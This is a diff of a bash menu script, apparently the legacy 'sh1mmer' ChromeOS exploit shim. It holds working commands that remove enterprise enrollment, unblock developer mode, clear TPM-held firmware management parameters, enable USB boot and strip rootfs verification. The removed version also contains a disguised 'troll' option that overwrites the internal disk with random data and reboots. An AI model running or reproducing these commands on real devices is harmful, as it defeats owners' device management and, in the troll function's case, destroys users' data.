@@ -1,82 +1,140 @@
-devmode() {
-    echo "disabling block_devmode"
-    vpd -i RW_VPD -s check_enrollment=0
-    vpd -i RW_VPD -s block_devmode=0
-    crossystem block_devmode=0
-    res=$(cryptohome --action=get_firmware_management_parameters 2>&1)
-    if [ $? -eq 0 ] && [[ ! $(echo $res | grep "Unknown action") ]]
-    then
-        tpm_manager_client take_ownership >/dev/null
-        cryptohome --action=remove_firmware_management_parameters >/dev/null
-    fi
-}
+#!/bin/bash
+
 deprovision() {
-    echo "deprovisioning"
-    vpd -i RW_VPD -s check_enrollment=0
+	echo "Deprovisioning..."
+	vpd -i RW_VPD -s check_enrollment=0
+	unblock_devmode
 }
+
 reprovision() {
-    echo "reprovisioning"
-    vpd -i RW_VPD -s check_enrollment=1
+	echo "Reprovisioning..."
+	vpd -i RW_VPD -s check_enrollment=1
+	echo "Done"
 }
-usb() {
-    echo "enabling usb boot"
-    crossystem dev_boot_usb=1
-}
-fix_gbb() {
-    echo "Make sure you have WP off"
-    /usr/share/vboot/bin/set_gbb_flags.sh 0x0
-    echo "GBB fixed"
 
+unblock_devmode() {
+	echo "Unblocking devmode..."
+	vpd -i RW_VPD -s block_devmode=0
+	crossystem block_devmode=0
+	res=$(cryptohome --action=get_firmware_management_parameters 2>&1)
+	if [ $? -eq 0 ] && [[ ! $(echo $res | grep "Unknown action") ]]; then
+		tpm_manager_client take_ownership
+		# sleeps no longer needed
+		cryptohome --action=remove_firmware_management_parameters
+	fi
+	echo "Done"
 }
+
+enable_usb_boot() {
+	echo "Enabling USB/altfw boot"
+	crossystem dev_boot_usb=1
+	crossystem dev_boot_legacy=1
+	crossystem dev_boot_altfw=1
+	echo "Done"
+}
+
+reset_gbb() {
+	echo "Resetting GBB flags... This will only work if WP is disabled"
+	/usr/share/vboot/bin/set_gbb_flags.sh 0x0
+	echo "Done"
+}
+
+get_largest_nvme_namespace() {
+	local largest size tmp_size dev
+	size=0
+	dev=$(basename "$1")
+
+	for nvme in /sys/block/"${dev%n*}"*; do
+		tmp_size=$(cat "${nvme}"/size)
+		if [ "${tmp_size}" -gt "${size}" ]; then
+			largest="${nvme##*/}"
+			size="${tmp_size}"
+		fi
+	done
+	echo "${largest}"
+}
+
 disable_verity() {
-    echo "Creating dev SSD..."
-    /usr/share/vboot/bin/make_dev_ssd.sh -i /dev/mmcblk0 --remove_rootfs_verification
-}
-troll() {
-    dd if=/dev/urandom of=/dev/mmcblk0 &
-    sleep 1
-    echo "think about this. you just ran a random script from the internet that you have no idea what it does."
-    echo "maybe that was a bad idea!"
-    sleep 4
-    reboot
+	DST=$(get_largest_nvme_namespace)
+	echo "READ THIS!!!!!! DON'T BE STUPID"
+	echo "This script will disable rootfs verification. What does this mean? You'll be able to edit any file on the chromebook, useful for development, messing around, etc"
+	echo "IF YOU DO THIS AND GO BACK INTO VERIFIED MODE (press the space key when it asks you to on the boot screen) YOUR CHROMEBOOK WILL STOP WORKING AND YOU WILL HAVE TO RECOVER"
+	sleep 4
+	read -p "Do you still want to do this? [Y/N]" confirm
+	case "$confirm" in
+	Y | y) /usr/share/vboot/bin/make_dev_ssd.sh -i "$DST" --remove_rootfs_verification ;;
+	*) return ;;
+	esac
 }
 
-echo "SH1MMER EXPLOIT"
-echo "Warning: This is a legacy version of sh1mmer"
+factory() {
+	clear
+	bash /usr/sbin/factory_install_backup.sh
+}
+
+splash() {
+	printf "\033[1;92m"
+	echo "ICBfX18gXyAgXyBfIF9fICBfXyBfXyAgX18gX19fIF9fXyAKIC8gX198IHx8IC8gfCAgXC8gIHwgIFwvICB8IF9ffCBfIFwKIFxfXyBcIF9fIHwgfCB8XC98IHwgfFwvfCB8IF98fCAgIC8KIHxfX18vX3x8X3xffF98ICB8X3xffCAgfF98X19ffF98X1wKCg==" | base64 -d
+	printf "\033[0m"
+}
+
+credits() {
+	echo "CREDITS:"
+	echo "CoolElectronics#4683 - Pioneering this wild exploit"
+	echo "ULTRA BLUE#1850 - Testing & discovering how to disable rootfs verification"
+	echo "Unciaur#1408 - Found the inital RMA shim"
+	echo "TheMemeSniper#6065 - Testing"
+	echo "Rafflesia#8396 - Hosting files"
+	echo "Bypassi#7037 - Helped with the website"
+	echo "r58Playz#3467 - Helped us set parts of the shim & made the initial GUI script"
+	echo "OlyB#9420 - Scraped additional shims + this legacy script"
+	echo "Sharp_Jack#4374 - Created wax & compiled the first shims"
+	echo "ember#0377 - Helped with the website"
+	echo "Mark - Technical Understanding and Advisory into the ChromeOS ecosystem"
+}
+
+setterm -cursor on
+clear
+splash
+echo "This is a legacy version of sh1mmer."
+
 while true; do
-    echo "(b) Open Bash Shell"
-    echo "(d) Deprovision Device"
-    echo "(r) Reprovision Device"
-    echo "(m) Disable block_devmode"
-    echo "(u) Enable USB Boot"
-    echo "(f) Fix GBB flags (in case of an accidental bootloop) WP MUST BE TURNED OFF"
-    echo "(v) Disable RootFS verification"
-    echo "(t) you know you want to press this menu option don't you"
-    echo "(e) Exit and reboot"
-    read -p "> (b/d/r/u/f/v/t/e): " choice
-    case "$choice" in
-    b | B) bash ;;
-    d | D) deprovision ;;
-    r | R) reprovision ;;
-    m | M) devmode ;;
-    u | U) usb ;;
-    f | F) fix_gbb ;;
-    v | V) disable_verity ;;
-    t | T) troll ;;
-    e | E) break ;;
-    *) echo "invalid option" ;;
-    esac
+	echo "Select an option:"
+	echo "(b) Bash shell"
+	echo "(d) Deprovision device"
+	echo "(r) Reprovision device"
+	echo "(m) Unblock devmode"
+	echo "(u) Enable USB/altfw boot"
+	echo "(g) Reset GBB flags (in case of an accidental bootloop) WP MUST BE DISABLED"
+	echo "(v) Remove rootfs verification"
+	echo "(t) Call chromeos-tpm-recovery"
+	echo "(f) Continue to factory installer"
+	echo "(c) Credits"
+	echo "(e) Exit and reboot"
+	read -p "> " choice
+	case "$choice" in
+	b | B) bash ;;
+	d | D) deprovision ;;
+	r | R) reprovision ;;
+	m | M) unblock_devmode ;;
+	u | U) enable_usb_boot ;;
+	g | G) reset_gbb ;;
+	v | V) disable_verity ;;
+	t | T) chromeos-tpm-recovery ;;
+	f | F) factory ;;
+	c | C) credits ;;
+	e | E) break ;;
+	*) echo "Invalid option" ;;
+	esac
+	echo ""
 done
 
-echo "CREDITS:"
-echo "CoolElectronics - Creating this script"
-echo "Bideos - Testing & discovering how to disable root-fs verification"
-echo "Sharp_Jack - Creating the wax automation tool"
-echo "Unciaur - Testing"
-echo "TheMemeSniper/Kaitlin - Testing"
-echo "OlyB - Scraping more shims"
-echo "Rafflesia - Hosting"
+setterm -cursor off
+clear
+splash
+credits
 sleep 6
-echo "rebooting"
+echo ""
+echo "Rebooting..."
 reboot
-exit
+sleep infinity
